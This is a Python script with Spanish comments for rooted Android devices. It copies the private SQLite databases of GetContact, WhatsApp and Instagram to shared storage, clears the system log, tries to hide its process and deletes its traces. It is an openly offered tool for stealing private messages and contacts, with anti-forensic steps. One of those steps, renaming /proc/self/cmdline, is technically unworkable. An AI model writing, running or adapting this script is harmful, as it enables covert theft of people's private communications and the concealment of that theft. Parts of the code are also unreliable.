#!/usr/bin/env python3
import os
import random
import time
import shutil
import subprocess
from datetime import datetime

# Configuración
TARGET_APPS = ["com.getcontact", "com.whatsapp", "com.instagram.android"]  # Paquetes objetivo
OUTPUT_DIR = "/sdcard/extracted_dbs"
TEMP_DIR = "/data/local/tmp/.tmp_evade"

def check_root():
    """Verifica si el dispositivo está rooteado."""
    return os.path.exists("/system/xbin/su") or os.path.exists("/system/bin/su")

def evade_detection():
    """Técnicas básicas de evasión."""
    # Retardo aleatorio para evitar análisis de comportamiento
    time.sleep(random.uniform(1, 3))
    
    # Ofuscar nombre del proceso
    os.rename("/proc/self/cmdline", "/proc/self/cmdline.bak")
    
    # Limpiar logs
    subprocess.run(["logcat", "-c"], check=False)

def extract_databases(app_package):
    """Extrae bases de datos de una aplicación específica."""
    app_dir = f"/data/data/{app_package}/databases"
    if not os.path.exists(app_dir):
        print(f"[!] Directorio de bases de datos no encontrado para {app_package}")
        return
    
    os.makedirs(f"{OUTPUT_DIR}/{app_package}", exist_ok=True)
    
    for db_file in os.listdir(app_dir):
        if db_file.endswith((".db", ".sqlite")):
            src = f"{app_dir}/{db_file}"
            dst = f"{OUTPUT_DIR}/{app_package}/{db_file}"
            
            # Copiar archivo con permisos de root
            subprocess.run(["cp", src, dst], check=False)
            print(f"[+] Base de datos extraída: {dst}")

def clean_traces():
    """Limpia rastros de la ejecución."""
    if os.path.exists(TEMP_DIR):
        shutil.rmtree(TEMP_DIR)
    print("[*] Rastros eliminados")

def main():
    if not check_root():
        print("[!] Este script requiere un dispositivo rooteado.")
        return
    
    evade_detection()
    
    for app in TARGET_APPS:
        print(f"[*] Procesando aplicación: {app}")
        extract_databases(app)
    
    clean_traces()
    print("[*] Extracción completada.")

if __name__ == "__main__":
    main()